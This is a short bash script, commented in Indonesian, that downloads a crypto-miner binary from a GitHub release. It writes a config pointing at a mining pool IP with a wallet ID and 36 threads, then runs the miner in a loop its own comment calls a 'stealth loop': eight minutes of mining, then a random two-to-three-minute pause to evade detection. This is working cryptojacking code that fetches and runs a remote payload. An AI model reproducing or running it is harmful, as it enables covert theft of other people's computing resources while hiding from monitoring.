#!/bin/bash

# Download dan ekstrak miner
wget github.com/vokerjok/Voker/releases/download/Voker/joko.tar.gz
tar -xvf joko.tar.gz
rm -rvf joko.tar.gz
cd joko

# Buat file config
cat > config.json <<END
{
  "url": "128.199.126.117:80",
  "user": "MntUvZfYEvGvaYWSrkRvrW41YN5u7diF5R.joko",
  "pass": "x",
  "threads": 36,
  "algo": "power2b"
}
END

# Set permission
chmod +x config.json joko

# Stealth loop: 8 menit mining, 2–3 menit off
while true; do
  echo "[+] Mining for 8 minutes..."
  ./joko -c config.json &
  MINER_PID=$!

  sleep 480  # 8 menit
  echo "[*] Stopping mining temporarily..."
  kill $MINER_PID

  # Sleep 2–3 menit acak
  OFF_TIME=$((RANDOM % 61 + 120))  # 120s - 180s
  echo "[*] Sleeping for $OFF_TIME seconds..."
  sleep $OFF_TIME
done
